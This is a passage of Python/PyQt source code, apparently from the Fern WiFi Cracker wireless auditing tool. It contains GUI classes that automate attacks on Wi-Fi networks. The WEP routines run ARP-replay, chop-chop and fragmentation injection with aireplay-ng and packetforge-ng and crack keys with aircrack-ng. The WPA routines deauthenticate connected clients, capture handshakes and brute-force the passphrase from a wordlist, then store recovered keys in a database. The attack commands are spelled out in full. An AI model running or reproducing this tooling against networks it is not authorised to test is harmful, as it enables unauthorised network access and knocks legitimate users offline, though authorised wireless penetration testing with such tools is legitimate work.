        self.associate_label.setText('<font color=yellow>Security countermeasure Activated</font>')


    def progress_maximum(self):
        global ivs_value
        self.ivs_progress.setValue(ivs_value)

    def update_bar(self):
        global ivs_number
        if 'wep_dump-01.csv' in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            update_main = reader('/tmp/fern-log/WEP-DUMP/wep_dump-01.csv')
            update_filter = update_main.replace(',','\n')
            update_filter2 = update_filter.splitlines()
            try:
                update_progress = int(update_filter2[26].strip(' '))
            except IndexError:time.sleep(1)
            try:
                self.ivs_progress.setValue(update_progress)
                ivs_number = update_progress
                self.ivs_progress_label.setEnabled(True)
                self.ivs_progress_label.setText('<font color=yellow>%s ivs</font>'%(str(update_progress)))
            except UnboundLocalError:time.sleep(1)
        else:
            pass

    def gathering(self):
        self.injecting_label.setEnabled(True)
        self.injecting_label.setText('<font color=yellow>Gathering Packets</font>')

    def passive_mode(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Passive Mode Activated</font>')

    def injecting(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Arp Packets</font>')

    def chop_chop_attack(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Chop-Chop Packets</font>')

    def fragmented_attack(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Fragmented Packets</font>')

    def key_not_found_yet(self):
        self.cracking_label.setEnabled(True)
        self.cracking_label.setText('<font color=yellow>Cracking Encryption</font>')

    def key_found(self):
        self.cracking_label.setEnabled(True)
        self.cracking_label.setText('<font color=yellow>Cracking Encryption</font>')
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        self.wep_key_label.setEnabled(True)
        self.wep_key_label.setText('<font color=red>%s</font>'%(WEP))
        self.wep_status_label.setEnabled(True)
        self.wep_status_label.setText('<font color=yellow>Wep Encryption Broken</font>')
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall airmon-ng')


    def cracking(self):
        self.wep_status_label.setEnabled(True)
        self.wep_status_label.setText('<font color=red>Please Wait....</font>')

    #
    # THREADS FOR AUTOMATION
    #
    def injection_status(self):
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        injection_string = ''
        while 'Injection is working' not in injection_string:
            injection_string += str(commands.getstatusoutput('aireplay-ng -9 %s'%(monitor)))
            self.emit(QtCore.SIGNAL("injection_not_working"))

        self.emit(QtCore.SIGNAL("injection_working"))


    def update_progress_bar(self):
        global ivs_number
        global digit
        global ivs_value
        global wep_string

        if 'ivs_settings.log' in os.listdir('/tmp/fern-log'):
            ivs_value = int(reader('/tmp/fern-log/ivs_settings.log'))
            maximum = self.ivs_progress.setMaximum(ivs_value)
            maximum = self.ivs_progress.setRange(0,ivs_value)
        else:
            ivs_value = 10000
            maximum = self.ivs_progress.setMaximum(10000)
            maximum = self.ivs_progress.setRange(0,10000)


        while ivs_number <= ivs_value:
            time.sleep(0.4)
            self.emit(QtCore.SIGNAL("update_progress_bar"))

        self.emit(QtCore.SIGNAL("progress maximum"))
        thread.start_new_thread(self.crack_wep,())                   #Thread for cracking wep

        thread.start_new_thread(self.key_check,())
        self.emit(QtCore.SIGNAL("cracking"))
        time.sleep(13)

        if 'KEY FOUND!' not in wep_string:
            self.emit(QtCore.SIGNAL("next_try"))
            QtCore.SIGNAL("update_progress_bar")
            thread.start_new_thread(self.next_phase,())


    def updater(self):
        global wep_string
        while 'KEY FOUND!' not in wep_string:
            self.emit(QtCore.SIGNAL("update_progress_bar"))
            time.sleep(1)

    def next_phase(self):
        global wep_string
        thread.start_new_thread(self.updater,())
        while 'KEY FOUND!' not in wep_string:
            time.sleep(0.4)
            commands.getstatusoutput('killall aircrack-ng')
            thread.start_new_thread(self.crack_wep,())
            time.sleep(9)
        self.emit(QtCore.SIGNAL("key not found yet"))
        self.emit(QtCore.SIGNAL("wep found"))

        ########################################### SPECIAL COMMAND THREADS ######################################
    def dump_thread(self):
        wep_victim_channel = victim_channel
        access_point_mac = victim_mac
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput('airodump-ng -c %s -w /tmp/fern-log/WEP-DUMP/wep_dump --bssid %s %s'%(wep_victim_channel,access_point_mac,monitor))

    def association_thread(self):
        global scan_control
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log'))

        self.emit(QtCore.SIGNAL("associating"))
        association_string = ''
        association_timer = 0
        while True:
            association_string += str(commands.getstatusoutput('aireplay-ng -1 0 -a %s -h %s %s'%(victim_mac,attacker_mac_address.strip('\n'),monitor)))
            if'Association successful :-)' in association_string:
                thread.start_new_thread(self.successful_accociation_process,())
                break
            if association_timer >= 2:
                thread.start_new_thread(self.unsuccessful_association_process,())
                break
            if scan_control != 0:
                break
            association_timer += 1


    def unsuccessful_association_process(self):
        self.emit(QtCore.SIGNAL('association failed'))
        self.emit(QtCore.SIGNAL("gathering"))
        thread.start_new_thread(self.dump_thread,())
        time.sleep(4)
        thread.start_new_thread(self.update_progress_bar,())
        self.emit(QtCore.SIGNAL('passive mode'))



    def successful_accociation_process(self):
        attack_mode = self.attack_type_combo.currentText()
        thread.start_new_thread(self.update_progress_bar,())
        self.emit(QtCore.SIGNAL("gathering"))
        thread.start_new_thread(self.update_progress_bar,())
        time.sleep(4)
        if attack_mode == 'Arp Request Replay':
            thread.start_new_thread(self.arp_request_thread,())     # arp_request_thread
            self.emit(QtCore.SIGNAL("injecting"))

        elif attack_mode == 'Chop-Chop Attack':                     # Chop-Chop attack thread
            thread.start_new_thread(self.chop_chop_thread,())

        else:
            thread.start_new_thread(self.fragmentation_thread,())   # Fragmentation attack thread


     ##################################### WEP ATTACK MODES ###############################


    def arp_request_thread(self):
        access_point_mac = victim_mac
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput("cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -3 -e '%s' -b %s %s"%(victim_access_point,access_point_mac,monitor))

    def chop_chop_thread(self):
        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log'))
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        access_point_mac = victim_mac
        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -4 -F -h %s  %s'%(attacker_mac_address,monitor))

        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y \
                                    /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/chop_chop.cap'%(access_point_mac,attacker_mac_address))
        self.emit(QtCore.SIGNAL("chop-chop injecting"))
        self.emit(QtCore.SIGNAL("chop-chop injecting"))
        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/chop_chop.cap %s'%(monitor))

    def fragmentation_thread(self):
        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log'))
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        access_point_mac = victim_mac

        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -5 -F -b %s -h %s %s'%(access_point_mac,attacker_mac_address,monitor))
        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/fragmented.cap'%(access_point_mac,attacker_mac_address))
        self.emit(QtCore.SIGNAL("fragment injecting"))
        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/fragmented.cap %s'%(monitor))


    def crack_wep(self):
        global wep_string
        while 'KEY FOUND!' not in wep_string:
            wep_string += commands.getstatusoutput('aircrack-ng /tmp/fern-log/WEP-DUMP/*.cap')[1]
            time.sleep(40)



    def key_check(self):
        global WEP
        global wep_string
        while 'KEY FOUND!' not in wep_string:
            self.emit(QtCore.SIGNAL("key not found yet"))
            time.sleep(2)

        self.emit(QtCore.SIGNAL("key not found yet"))
        time.sleep(7)
        while 'KEY FOUND!' not in wep_string:
            time.sleep(4)

        for find_key in wep_string.splitlines():        # SORTS OUT THE WEP KEY
            if 'KEY FOUND!' in find_key:
                key = find_key

        process = key[key.index('KEY FOUND!'):-1]
        process_initial = process.splitlines()[0]
        processed_key_init = process_initial.index('[')
        processed_key_init1 = process_initial[processed_key_init:-1]
        processed_key = processed_key_init1.strip('[]')
        WEP = processed_key
        self.emit(QtCore.SIGNAL("wep found"))
        commands.getstatusoutput('killall aircrack-ng')
        commands.getstatusoutput('killall aireplay-ng')
        commands.getstatusoutput('killall airmon-ng')
        commands.getstatusoutput('killall airodump-ng')
        if len(WEP) > 0:
            set_key_entries(victim_access_point,'WEP',str(WEP.replace(':','')),victim_channel)      #Add WEP Key to Database Here
            update_database_label()
        else:
            update_database_label()



        ############################################# END OF THREAD ################################


    def run_wep_attack(self):
        thread.start_new_thread(self.dump_thread,())                  # airodump_thread
        thread.start_new_thread(self.association_thread,())           # association_thread


    def wep_launch_attack(self):
        global wep_string
        global scan_label
        wep_string = ''
        scan_label.setText("Points<font Color=red>\t Stopped</font>")
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall airmon-ng')

        global ivs_number
        global WEP
        ivs_number = 0
        WEP = ''
        commands.getstatusoutput('rm -r /tmp/fern-log/WEP-DUMP/*')
        thread.start_new_thread(self.injection_status,())
        thread.start_new_thread(self.run_wep_attack,())





#
# Wpa Attack window class for decrypting wep keys
#
class wpa_attack_dialog(QtGui.QDialog,wpa_window):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)

        self.connect(self.wpa_access_point_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.selected_wpa_access)
        self.connect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
        self.connect(self.dictionary_button,QtCore.SIGNAL("clicked()"),self.dictionary_set)
        self.connect(self,QtCore.SIGNAL("update client"),self.update_client_list)
        self.connect(self,QtCore.SIGNAL("client not in list"),self.display_client)
        self.connect(self,QtCore.SIGNAL("client is there"),self.client_available)
        self.connect(self,QtCore.SIGNAL("deauthenticating"),self.deauthenticating_display)
        self.connect(self,QtCore.SIGNAL("handshake captured"),self.handshake_captured)
        self.connect(self,QtCore.SIGNAL("bruteforcing"),self.bruteforce_display)
        self.connect(self,QtCore.SIGNAL("wpa key found"),self.wpa_key_found)
        self.connect(self,QtCore.SIGNAL("update word"),self.update_word_label)
        self.connect(self,QtCore.SIGNAL("update progress bar"),self.update_progress_bar)
        self.connect(self,QtCore.SIGNAL("update speed"),self.update_speed_label)
        self.connect(self,QtCore.SIGNAL("wpa key not found"),self.key_not_found)
        self.connect(self,QtCore.SIGNAL("set maximum"),self.set_maximum)
        self.connect(self,QtCore.SIGNAL("Stop progress display"),self.display_label)
        if len(client_list) == 0:
            thread.start_new_thread(self.auto_add_clients,())

        combo_temp = reader('/tmp/fern-log/WPA/wpa_details.log')
        combo_list = combo_temp.splitlines()
        self.essid_label.setText('<font color=red>%s</font>'%(combo_list[4]))
        self.bssid_label.setText('<font color=red>%s</font>'%(combo_list[0]))
        self.channel_label.setText('<font color=red>%s</font>'%(combo_list[1].lower()))
        self.power_label.setText('<font color=red>%s</font>'%(combo_list[3].lower()))
        self.encrypt_wep_label.setText('<font color=red>WPA</font>')
        list_ = []
        access_point_value = 4
        for iterate in range(0,combo_temp.count('\n')/5):
            if combo_list[access_point_value] not in list_:
                list_.append(combo_list[access_point_value])
                access_point_value += 5
            else:
                access_point_value += 5

        list_.sort()
        self.wpa_access_point_combo.addItems(list_)


    #
    # SIGNALS AND SLOTS
    #

    def update_client_list(self):
        global client_list
        client_mac_addresses = []
        for mac_address in client_list:
            if str(mac_address) not in client_mac_addresses:
                client_mac_addresses.append(str(mac_address))
        self.client_label_combo.clear()
        self.client_label_combo.addItems(client_mac_addresses)

    def display_client(self):
        self.wpa_status_label.setEnabled(True)
        self.wpa_status_label.setText("<font color=red>Automatically probing and adding clients mac-addresses, please wait...</font>")

    def client_available(self):
        self.wpa_status_label.setEnabled(False)
        self.wpa_status_label.setText("wpa encryption status")

    def deauthenticating_display(self):
        self.deauthenticate_label.setEnabled(True)
        self.deauthenticate_label.setText('<font color=yellow>Deauthenticating %s</font>'%(select_client))

    def handshake_captured(self):
        self.handshake_label.setEnabled(True)
        self.handshake_label.setText('<font color=yellow>Handshake Captured</font>')

    def bruteforce_display(self):
        self.bruteforcing_label.setEnabled(True)
        self.bruteforcing_label.setText('<font color=yellow>Bruteforcing WPA Encryption</font>')

    def wpa_key_found(self):
        wpa_key_read = reader('/tmp/fern-log/WPA-DUMP/wpa_key.txt')
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        self.wpa_status_label.setEnabled(True)
        self.wpa_status_label.setText('<font color=yellow>Wpa Encryption Broken</font>')
        self.wpa_key_label.setEnabled(True)
        self.wpa_key_label.setText('<font color=red>%s</font>'%(wpa_key_read))
        set_key_entries(wpa_victim_access,'WPA',wpa_key_read,wpa_victim_channel)            #Add WPA Key to Database Here
        update_database_label()


    def update_word_label(self):
        self.bruteforce_progress_label.setEnabled(True)
        self.bruteforce_progress_label.setText('<font color=yellow>%s</font>'%(current_word))

    def update_progress_bar(self):
        self.bruteforce_progressbar.setValue(word_number)

    def update_speed_label(self):
        self.wpa_status_label.setEnabled(True)
        self.wpa_status_label.setText('<font color=yellow>Speed: \t %s</font>'%(current_speed))

    def display_label(self):
        self.wpa_status_label.setEnabled(True)
        self.wpa_status_label.setText('<font color=yellow>Wpa Encryption Broken</font>')

    def key_not_found(self):
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        if 'wpa_key.txt' in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            pass
        else:
            self.wpa_status_label.setEnabled(True)
            self.wpa_status_label.setText('<font color=red>WPA Key was not found, please try another wordlist file</font>')

    def set_maximum(self):
        self.bruteforce_progressbar.setValue(progress_bar_max)



    #
    # Threads For Automation
    #
    def auto_add_clients(self):
        global client_list
        temp_mac_address = str(wpa_victim_mac_address.strip(' '))
        while temp_mac_address not in client_list:
            if len(client_list) >= 1:
                self.emit(QtCore.SIGNAL("client is there"))
                self.emit(QtCore.SIGNAL("update client"))
                break
            else:
                time.sleep(3)
                self.emit(QtCore.SIGNAL("client not in list"))
                client_update()
                self.emit(QtCore.SIGNAL("update client"))

    def launch_brutefore(self):
        global control
        crack_process = subprocess.Popen("cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng -a 2 -w '%s' *.cap -l wpa_key.txt | grep 'Current passphrase'"%(wordlist),
                             shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

        stdout = crack_process.stdout

        while 'wpa_key.txt' not in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            progress_file = open('/tmp/fern-log/WPA-DUMP/progress.txt','a+')
            file_read = stdout.readline()
            progress_file.write(str(file_read))
            progress_file.close()

        self.emit(QtCore.SIGNAL("wpa key found"))


    def wordlist_check(self):
        control_word = 0
        global current_word
        while control_word != 1:
            controller = current_word
            time.sleep(18)
            if controller == current_word:
                control_word = 1
                self.emit(QtCore.SIGNAL("set maximum"))
                self.emit(QtCore.SIGNAL("wpa key not found"))
            else:
                pass




    def progress_update(self):
        global current_word
        global word_number
        global current_speed
        global word_number
        global control
        while 'wpa_key.txt' not in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            time.sleep(5)
            try:
                current_word = ''
                progress_process = reader('/tmp/fern-log/WPA-DUMP/progress.txt')
                progress_process1 = progress_process.splitlines()
                progress_process2 = progress_process1[-1]
                progress_process3 = progress_process2.replace('Current passphrase:','\n')
                progress_process3 = progress_process3.replace('keys tested','\n')
                progress_process4 = progress_process3.splitlines()
                current_word = progress_process4[-1].strip(' ')
                self.emit(QtCore.SIGNAL("update word"))
                word_number_process = progress_process4[0]
                word_number_process1 = word_number_process.replace(']','\n')
                word_number_process2 = word_number_process1.splitlines()
                word_number = int(word_number_process2[-1])
                self.emit(QtCore.SIGNAL("update progress bar"))
                current_speed_process = progress_process4[1]
                current_speed_process1 = current_speed_process.replace('k/s)','k/s)\n')
                current_speed_process2 = current_speed_process1.splitlines()
                current_speed = current_speed_process2[0].strip(' ')
                self.emit(QtCore.SIGNAL("update speed"))
                if word_number >= progress_bar_max:
                    self.emit(QtCore.SIGNAL("wpa key not found"))
                    control = 1
                    break
                else:
                    pass
                commands.getstatusoutput('rm -r /tmp/fern-log/WPA-DUMP/progress.txt')
            except (IndexError,ValueError,IOError),e:
                pass

        self.emit(QtCore.SIGNAL("Stop progress display"))



    def wpa_capture(self):
        monitor_interface = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput('airodump-ng --bssid %s --channel %s -w /tmp/fern-log/WPA-DUMP/wpa_dump %s'%(wpa_victim_mac_address,wpa_victim_channel,monitor_interface))

    def deauthenticate_client(self):
        monitor_interface = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput('aireplay-ng -a %s -c %s -0 5 %s'%(wpa_victim_mac_address,select_client,monitor_interface))

    def capture_check(self):
        commands.getstatusoutput('cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng *.cap | tee capture_status.log')

    def capture_loop(self):
        time.sleep(3)
        self.emit(QtCore.SIGNAL("deauthenticating"))
        while '1 handshake' not in reader('/tmp/fern-log/WPA-DUMP/capture_status.log'):
            thread.start_new_thread(self.deauthenticate_client,())
            time.sleep(10)
            thread.start_new_thread(self.capture_check,())
        self.emit(QtCore.SIGNAL("handshake captured"))                                        # THIS IS THE PROGRAM COUNTINUE
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall aireplay-ng')
        time.sleep(1)
        self.emit(QtCore.SIGNAL("bruteforcing"))

        thread.start_new_thread(self.launch_brutefore,())

        thread.start_new_thread(self.progress_update,())

        thread.start_new_thread(self.wordlist_check,())



    #
    # Widget Object Functions
    #
    def selected_wpa_access(self):
        global wpa_victim_mac_address
        global wpa_victim_channel
        global wpa_victim_access
        global client_list
        client_list = []
        self.client_label_combo.clear()
        wpa_victim_access = self.wpa_access_point_combo.currentText()
        wpa_access_points = reader('/tmp/fern-log/WPA/wpa_details.log')
        access_points_list = wpa_access_points.splitlines()
        wpa_access_point = access_points_list.index(wpa_victim_access)
        wpa_victim_mac_address = access_points_list[wpa_access_point-4]
        wpa_victim_channel = access_points_list[wpa_access_point-3]
        wpa_victim_power = access_points_list[wpa_access_point-1]
        wpa_victim_speed = access_points_list[wpa_access_point-2]
        self.essid_label.setText('<font color=red>%s</font>'%(str(wpa_victim_access)))
        self.bssid_label.setText('<font color=red>%s</font>'%(str(wpa_victim_mac_address)))
        self.channel_label.setText('<font color=red>%s</font>'%(str(wpa_victim_channel)))
        self.power_label.setText('<font color=red>%s</font>'%(str(wpa_victim_power)))
        self.encrypt_wep_label.setText('<font color=red>WPA</font>')
        client_update()
        self.emit(QtCore.SIGNAL("update client"))
        if len(client_list) == 0:
            thread.start_new_thread(self.auto_add_clients,())


    def launch_attack(self):
        global scan_label
        global wordlist
        global select_client
        global progress_bar_max
        global scan_label
        scan_label.setText("Points<font Color=red>\t Stopped</font>")
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall airmon-ng')
        commands.getstatusoutput('rm -r /tmp/fern-log/WPA-DUMP/*')
        select_client = self.client_label_combo.currentText()
        if select_client == '':
            self.probe_label.setEnabled(True)
            self.probe_label.setText('<font color=red>Client mac-address is needed</font>')
        else:
            if 'wordlist-settings.dat' not in os.listdir('fern-settings'):
                self.dictionary_label.setEnabled(True)
                self.dictionary_label.setText('<font color=red><b>Select Wordlist</b></font>')
            else:
                self.wpa_status_label.setEnabled(False)
                self.wpa_status_label.setText("wpa encryption status")

                get_temp_name = reader('fern-settings/wordlist-settings.dat')   #Just for displaying name of wordlist to label area
                split_name = get_temp_name.replace('/','\n')
                filename_split = split_name.splitlines()
                try:
                    filename = filename_split[-1]
                except IndexError:
                    self.dictionary_label.setEnabled(True)
                    self.dictionary_label.setText('<font color=red><b>Select Wordlist</b></font>')

                self.dictionary_label.setEnabled(True)
                try:
                    self.dictionary_label.setText('<font color=yellow><b>%s</b></font>'%(filename))
                except UnboundLocalError:
                    pass
                try:
                    wordlist = get_temp_name
                    wordlist_number = reader(get_temp_name)
                except IOError:
                    self.dictionary_label.setText('<font color=red><b>Select Wordlist</b></font>')
                progress_bar_max = wordlist_number.count('\n')
                self.bruteforce_progressbar.setMaximum(progress_bar_max)
                commands.getstatusoutput('killall airodump-ng')
                commands.getstatusoutput('killall aireplay-ng')
                self.probe_label.setEnabled(True)
                self.probe_label.setText("<font color=yellow>Probing Access Point</font>")
                commands.getstatusoutput('touch /tmp/fern-log/WPA-DUMP/capture_status.log')

                thread.start_new_thread(self.wpa_capture,())

                thread.start_new_thread(self.capture_loop,())



    def dictionary_set(self):
        filename = QtGui.QFileDialog.getOpenFileName(self,"Select Wordlist","")
        if 'wordlist-settings.dat' in os.listdir('fern-settings'):
            remove('fern-settings','wordlist-settings.dat')
            write('fern-settings/wordlist-settings.dat',filename)

        else:
            write('fern-settings/wordlist-settings.dat',filename)

        get_temp_name = reader('fern-settings/wordlist-settings.dat')
        split_name = get_temp_name.replace('/','\n')
        filename_split = split_name.splitlines()
        try:
            filename = filename_split[-1]
        except IndexError:
            self.dictionary_label.setText('<font color=red><b>Select Wordlist</b></font>')
        self.dictionary_label.setEnabled(True)
        self.dictionary_label.setText('<font color=yellow><b>%s</b></font>'%(filename))

#
#  Class for Database key entries
#
class database_dialog(QtGui.QDialog,database_ui):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)

        self.connect(self.insert_button,QtCore.SIGNAL("clicked()"),self.insert_row)
        self.connect(self.delete_button,QtCore.SIGNAL("clicked()"),self.delete_row)
        self.connect(self.save_button,QtCore.SIGNAL("clicked()"),self.save_changes)

        connection = sqlite3.connect('key-database/Database.db')
        query = connection.cursor()
        query.execute('''select * from keys''')
        items = query.fetchall()
        number_decision = str(items)
        wep_entries = number_decision.count('WEP')
        wpa_entries = number_decision.count('WPA')

        for iterate in range(0,wep_entries + wpa_entries):              # Update QTable with entries from Database and

            tuple_sequence = items[iterate]
            access_point_var = tuple_sequence[0]
            encryption_var = tuple_sequence[1].upper()
            key_var = tuple_sequence[2]
            channel_var = tuple_sequence[3]

            self.key_table.insertRow(iterate)

            access_point_display = QtGui.QTableWidgetItem()
            encryption_display = QtGui.QTableWidgetItem()
            key_display = QtGui.QTableWidgetItem()
            channel_display = QtGui.QTableWidgetItem()

            access_point_display.setText(QtGui.QApplication.translate("Dialog", "%s"%(access_point_var), None, QtGui.QApplication.UnicodeUTF8))
            self.key_table.setItem(iterate,0,access_point_display)

            encryption_display.setText(QtGui.QApplication.translate("Dialog", "%s"%(encryption_var), None, QtGui.QApplication.UnicodeUTF8))
            self.key_table.setItem(iterate,1,encryption_display)

            key_display.setText(QtGui.QApplication.translate("Dialog", "%s"%(key_var), None, QtGui.QApplication.UnicodeUTF8))
            self.key_table.setItem(iterate,2,key_display)

            channel_display.setText(QtGui.QApplication.translate("Dialog", "%s"%(channel_var), None, QtGui.QApplication.UnicodeUTF8))
            self.key_table.setItem(iterate,3,channel_display)

        update_database_label()



    def insert_row(self):
        self.key_table.insertRow(0)

    def delete_row(self):
        current_row = int(self.key_table.currentRow())
        self.key_table.removeRow(current_row)

    def save_changes(self):
        os.system('rm -r key-database/Database.db')
        database_create()
        row_number = self.key_table.rowCount()
        controller = 0

        while controller != row_number:
            access_point1 = QtGui.QTableWidgetItem(self.key_table.item(controller,0))   # Get Cell content
            encryption1 = QtGui.QTableWidgetItem(self.key_table.item(controller,1))
            key1 = QtGui.QTableWidgetItem(self.key_table.item(controller,2))
            channel1 = QtGui.QTableWidgetItem(self.key_table.item(controller,3))

            access_point = access_point1.text()                                         # Get cell content text
            encryption2 = str(encryption1.text())
            encryption = encryption2.upper()
            key = key1.text()
            channel = channel1.text()

            set_key_entries(access_point,encryption,key,channel)        # Write enrties to database

            controller += 1

        update_database_label()                                         # Update the Entries label on Main window




#
# Tool Box window class
#
class tool_box_window(QtGui.QDialog,toolbox_win):
    def __init__(self):
	QtGui.QDialog.__init__(self)
	self.setupUi(self)
	self.retranslateUi(self)

	self.connect(self.pushButton,QtCore.SIGNAL("clicked()"),self.font_exec)

    def font_exec(self):
        font_dialog_box = font_dialog()
        font_dialog_box.exec_()



class font_dialog(QtGui.QDialog,font_dialog):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)
        self.setWindowTitle('Font Settings')
        self.label_2.setText('Current Font: <font color=green><b>%s</b></font>'% \
                                (reader(os.getcwd() + '/.font_settings.dat' ).split()[2]))

        self.connect(self.buttonBox,QtCore.SIGNAL("accepted()"),self.set_font)

        font_range = []
        for font_numbers in range(1,21):
            font_range.append(str(font_numbers))
        self.comboBox.addItems(font_range)

    def set_font(self):
        if '.font_settings.dat' in os.listdir(os.getcwd()):
            os.remove('.font_settings.dat')
            choosen_font = self.comboBox.currentText()
            font_string  = 'font_size = %s'%(choosen_font)
            write('.font_settings.dat',font_string)

        self.close()
        QtGui.QMessageBox.information(self,'Font Settings','Please restart application to apply changes')




#
# Class dialog for automatic ivs captupe and limit reference
#
class ivs_dialog(QtGui.QDialog,ivs_window):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)
        ivs_list = ['Select IVS Rate','5000','10000','15000','20000','25000','30000','35000','40000','45000','50000','55000','60000','65000','70000']
        self.ivs_combo.addItems(ivs_list)

        self.connect(self.ok_button,QtCore.SIGNAL("clicked()"),self.ivs_settings)
        self.connect(self.cancel_button,QtCore.SIGNAL("clicked()"),QtCore.SLOT("close()"))

    def ivs_settings(self):
        current_ivs = str(self.ivs_combo.currentText())
        if 'ivs_settings.log' in os.listdir('/tmp/fern-log'):
            remove('/tmp/fern-log','ivs_settings.log')
        if current_ivs != 'Select IVS Rate':
            write('/tmp/fern-log/ivs_settings.log',current_ivs)

        self.close()



#
# Tips Dialog, show user tips on how to access settings dialog and set scan preferences
#
class tips_window(QtGui.QDialog,tips_dialog):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)

        self.connect(self.pushButton,QtCore.SIGNAL("clicked()"),self.accept)

    def accept(self):
        check_status = self.checkBox.isChecked()

        if check_status == True:
            write('fern-settings/tips-settings.dat','1')
        else:
            remove('fern-settings','tips-settings.dat')
        self.close()

#Finished Here (tips_window)

#
# Class for the settings dialog box
#
class settings_dialog(QtGui.QDialog,settings):
    def __init__(self):
        QtGui.QDialog.__init__(self)

        self.setupUi(self)
        try:
	       remove('fern-settings','xterm-settings.dat')
        except IOError:pass
        try:
            if reader('/tmp/fern-log/xterm-settings.log').isdigit() == True:
                self.xterm_checkbox.setChecked(True)
        except IOError:
            pass
        list_ = ['All Channels']
        for list_numbers in range(1,15):
            list_.append(str(list_numbers))
        self.channel_combobox.addItems(list_)
        self.connect(self.xterm_checkbox,QtCore.SIGNAL("clicked(bool)"),self.xterm)
        self.connect(self.channel_combobox,QtCore.SIGNAL("currentIndexChanged(QString)"),self.channel_log)


    #
    # Log selected temporary manual channel to fern-log directory
    #
    def channel_log(self):
        try:
            remove('/tmp/fern-log','static-channel.log')
        except IOError:
            pass
        channel = str(self.channel_combobox.currentText())
        if channel == 'All Channels':
            os.system('rm -r /tmp/fern-log/static-channel.log')
            pass
        else:
            write('/tmp/fern-log/static-channel.log',channel)

    #
    # Log xtern selectionn to fern-settings directory manual channel
    #
    def xterm(self):
        xterm_settings = self.xterm_checkbox.isChecked()
        if xterm_settings == True:
            remove('/tmp/fern-log','xterm-settings.log')
            write('/tmp/fern-log/xterm-settings.log','1')
        else:
            remove('/tmp/fern-log','xterm-settings.log')




if __name__ == '__main__':
        app = QtGui.QApplication(sys.argv)
        run = mainwindow()
        run.show()
        app.exec_()




